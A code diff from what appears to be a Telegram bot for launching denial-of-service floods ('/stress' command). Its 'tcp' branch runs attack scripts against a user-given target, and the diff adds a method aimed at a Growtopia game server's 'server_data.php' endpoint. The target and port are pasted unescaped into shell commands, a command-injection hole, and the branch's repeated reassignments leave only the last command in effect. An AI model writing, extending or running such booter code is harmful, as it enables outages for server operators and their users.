@@ -365,6 +365,7 @@ bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
     case 'tcp':
       command = `node methods/tcp.js ${target} ${port} ${duration}`
       command = `node methods/ovh.js ${target} ${port} ${duration}`
+      command = `node methods/killergt.js https://${target}/growtopia/server_data.php ${duration} ${port}`
       command = `node methods/dns.js ${target} ${port} ${duration}`
       command = `node methods/ntp.js ${target} ${port} ${duration}`
       break;
